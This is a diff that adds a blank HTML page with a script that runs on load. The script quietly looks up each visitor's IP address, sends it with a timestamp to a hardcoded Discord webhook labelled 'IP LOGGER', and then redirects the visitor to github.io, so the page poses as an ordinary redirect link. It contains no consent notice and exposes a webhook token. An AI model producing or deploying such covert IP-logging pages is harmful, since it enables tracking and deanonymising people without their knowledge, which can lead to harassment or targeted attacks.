@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <script>
+        async function logAndRedirect() {
+            const destination = "https://github.io";
+            const webhookUrl = "https://discord.com/api/webhooks/1538060698226270239/6uuCo3OPJBkJIuHhRIoVG0oZIv18gjKdnnSzXfBbGno-kP5QrB-pptH3sLb20bRvXEVS";
+            let userIp = "Unknown IP";
+
+            // Strategy 1: Attempt lookup through ipapi
+            try {
+                const response = await fetch('https://ipapi.co');
+                if (response.ok) {
+                    const data = await response.json();
+                    userIp = data.ip;
+                }
+            } catch (e) {
+                // Strategy 2: If ipapi fails, try a backup plain-text lookup
+                try {
+                    const backupResponse = await fetch('https://ipify.org');
+                    if (backupResponse.ok) {
+                        userIp = await backupResponse.text();
+                    }
+                } catch (backupError) {
+                    console.error("All local network lookup methods were blocked by the browser.");
+                }
+            }
+
+            // Send payload data to Discord
+            try {
+                const currentDate = new Date().toISOString().replace('T', ' ').substring(0, 19);
+                const payload = {
+                    content: "",
+                    title: "IP LOGGER",
+                    embeds: [{
+                        title: userIp,
+                        description: currentDate
+                    }]
+                };
+
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                    keepalive: true
+                });
+            } catch (error) {
+                console.error("Webhook submission error.");
+            }
+
+            // Redirect to the destination
+            window.location.replace(destination);
+        }
+
+        logAndRedirect();
+    </script>
+</head>
+<body>
+</body>
+</html>
